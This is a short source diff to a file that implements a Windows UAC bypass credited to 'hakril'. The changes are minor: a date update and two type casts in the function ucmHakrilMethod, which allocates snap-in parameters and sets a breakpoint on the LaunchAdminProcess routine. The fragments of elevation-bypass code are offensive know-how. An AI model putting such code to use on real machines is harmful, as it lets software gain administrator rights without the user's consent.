@@ -6,7 +6,7 @@
 *
 *  VERSION:     3.10
 *
-*  DATE:        11 Nov 2018
+*  DATE:        18 Nov 2018
 *
 *  UAC bypass method from Clement Rouault aka hakril.
 *
@@ -206,7 +206,7 @@ BOOL ucmHakrilMethod(
         //
         // Allocate and fill snap-in parameters buffer.
         //
-        g_SnapInParameters = supHeapAlloc(PAGE_SIZE);
+        g_SnapInParameters = (LPWSTR)supHeapAlloc(PAGE_SIZE);
         if (g_SnapInParameters == NULL)
             break;
 
@@ -217,7 +217,7 @@ BOOL ucmHakrilMethod(
         //
         // Setup function breakpoint.
         //
-        g_OriginalFunction = LaunchAdminProcessPtr;
+        g_OriginalFunction = (pfnAipFindLaunchAdminProcess)LaunchAdminProcessPtr;
         g_OriginalPrologue = 0;
         if (!AicSetRemoveFunctionBreakpoint(
             g_OriginalFunction,
